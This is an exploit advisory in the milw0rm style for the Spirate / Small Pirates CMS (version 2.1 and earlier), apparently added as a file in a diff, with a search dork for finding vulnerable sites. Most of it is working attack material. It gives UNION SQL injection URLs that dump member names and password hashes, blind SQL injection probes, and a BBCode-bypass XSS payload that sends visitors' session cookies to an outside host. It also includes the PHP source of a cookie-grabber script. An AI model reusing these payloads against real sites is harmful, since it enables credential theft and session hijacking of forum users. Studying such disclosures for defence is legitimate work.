@@ -1,0 +1,272 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	         MULTIPLE REMOTE VULNERABILITIES	             	     |
+|--------------------------------------------------------------------------------------------|
+|                                  |    Small Pirates v-2.1   |		 	     	     |
+|  CMS INFORMATION:		    --------------------------	                     	     |
+|										             |
+|-->WEB: http://spirate.net/foro/			          			     |
+|-->DOWNLOAD: http://spirate.net/foro/			                 		     |
+|-->DEMO: http://www.santiagoescraches.com.ar/index.php					     |
+|-->CATEGORY: CMS / Board								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: "Basado en Spirate"							             |
+|-->CATEGORY: SQL INJECTION VULNERABILITIES / COOKIE STEALING / BLIND SQL INJECTION          |
+|-->AFFECT VERSION: <= 2.1						 		     |
+|-->Discovered Bug date: 2009-05-10							     |
+|-->Reported Bug date: 2009-05-10							     |
+|-->Fixed bug date: N/A									     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: Nothing +++++++++++++++++--------->>>>
+
+
+-------
+INTRO:
+-------
+
+
+This system is a mixed combinations.
+
+Info by admin (quote):
+
+"cw*= SMF+Paquetes"
+"Spirate=cw+añadidos+reparaciones+correcciones"
+
+"*cw = casitaweb."
+
+
+-------------------
+PROOFS OF CONCEPT:
+-------------------
+
+
+[++] GET var --> 'id'
+
+[++] File vuln --> 'pag1.php'
+
+
+~~~~> http://[HOST]/pag1.php?id=-1+UNION+ALL+SELECT+1,2,3,version(),5,6/*
+
+
+[++] GET var --> 'id'
+
+[++] File vuln --> 'pag1-guest.php'
+
+
+~~~~> http://[HOST]/pag1-guest.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(user(),0x3A3A3A,database()),5,6/*
+
+
+[++] GET var --> 'id'
+
+[++] File vuln --> 'rss-coment_post.php'
+
+[++] Note --> More info in source code
+
+
+~~~~> http://[HOST]/web/rss/rss-coment_post.php?id=-1+UNION+ALL+SELECT+1,2,concat(user(),0x3A3A,database()),4,5,6,version(),8/*
+
+
+
+[++] GET var --> 'id'
+
+[++] File vuln --> 'rss-pic-comment.php'
+
+[++] Note --> More info in source code
+
+
+~~~~> http://[HOST]/web/rss/rss-pic-comment.php?id=-1+UNION+ALL+SELECT+1,2,3,4,current_user(),6,user(),8,9,user(),11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,version(),31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81/*
+
+
+[++[Return]++] ~~~~~> user, version and database.
+
+
+----------
+EXPLOITS:
+----------
+
+
+~~~~> http://[HOST]/pag1.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(memberName,0x3A3A3A,passwd),5,6+FROM+smf_members+WHERE+ID_MEMBER=1/*
+
+~~~~> http://[HOST]/pag1-guest.php?id=-1+UNION+ALL+SELECT+1,2,3,concat(memberName,0x3A3A3A,passwd),5,6+FROM+smf_members+WHERE+ID_MEMBER=1/*
+
+~~~~> http://[HOST]/web/rss/rss-coment_post.php?id=-1+UNION+ALL+SELECT+1,2,concat(memberName,0x3A3A3A,passwd),4,5,6,concat(memberName,0x3A3A3A,passwd),8+FROM+smf_members+WHERE+ID_MEMBER=1/*
+
+~~~~> http://[HOST]/web/rss/rss-pic-comment.php?id=-1+UNION+ALL+SELECT+1,2,3,4,concat(memberName,0x3A3A3A,passwd),6,concat(memberName,0x3A3A3A,passwd),8,9,concat(memberName,0x3A3A3A,passwd),11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,concat(memberName,0x3A3A3A,passwd),31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81+FROM+smf_members+WHERE+ID_MEMBER=1/*
+
+
+[++[Return]++] ~~~~~> memberName:::passwd in 'members' table
+
+
+
+######################################
+//////////////////////////////////////
+
+COOKIE STEALING VULN (BYPASS BBCODE):
+
+//////////////////////////////////////
+######################################
+
+
+<<<<---------++++++++++++++ Condition: Post a comment +++++++++++++++++--------->>>>
+
+
+-------
+INTRO:
+-------
+
+
+This system is a mixed combinations.
+
+Info by admin (quote):
+
+"cw*= SMF+Paquetes"
+"Spirate=cw+añadidos+reparaciones+correcciones"
+
+"*cw = casitaweb."
+
+
+-------------------
+PROOF OF CONCEPT:
+-------------------
+
+
+[url][img]http://www.google.es onmouseover=while(true){alert(1);} [/img][/url]
+
+
+[++[Return]++] ~~~~~> recursive alert message saying "1"
+
+
+----------
+EXPLOIT:
+----------
+
+
+Cookie Grabber Script --> capturethecookies.php
+
+Example Script (Before Creat exploited.txt):
+
+<?php
+$ck=$_GET["ck"]; //Capture the cookies	 
+$manejador=fopen("exploited.txt",'a');
+fwrite($manejador, "Cookie:\r\n".htmlentities($ck)."\r\n--EOF--\r\n"); //Save the values
+fclose($manejador);
+echo "<script>location.href='http://[HOST]/index.php';</script>"; //Redirect...
+?>
+
+Example Hosting --> http://www.myphpcookiestealing.es/capturethecookies.php?ck=
+
+Poisoning's comment:
+
+[url][img]http://www.owned.owned onmouseover=document.location=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,109,121,112,104,112,99,111,111,107,105,101,115,116,101,97,108,105,110,103,46,101,115,47,99,97,112,116,117,114,101,116,104,101,99,111,111,107,105,101,115,46,112,104,112,63,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61)+document.cookie [/img][/url]
+
+
+[++[Return]++] ~~~~~> Cookie and PHPSESSID in exploited.txt
+
+
+###########################
+///////////////////////////
+
+BLIND SQL INJECTION (SQLi):
+
+///////////////////////////
+###########################
+
+
+<<<<---------++++++++++++++ Condition: Nothing +++++++++++++++++--------->>>>
+
+
+-------
+INTRO:
+-------
+
+
+This system is a mixed combinations.
+
+Info by admin (quote):
+
+"cw*= SMF+Paquetes"
+"Spirate=cw+añadidos+reparaciones+correcciones"
+
+"*cw = casitaweb."
+
+
+-------------------
+PROOFS OF CONCEPT:
+-------------------
+
+
+[++] GET var --> 'id'
+
+[++] File vuln --> 'index.php'
+
+
+~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+1=1 --> TRUE
+
+~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+1=0 --> FALSE
+
+
+----------
+EXPLOITS:
+----------
+
+
+~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+substring(@@version,1,1)=5 --> TRUE
+
+~~~~> http://[HOST]/?type=rss;action=.xml;sa=comentarios;id=7+and+substring(@@version,1,1)=4 --> FALSE
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-29]
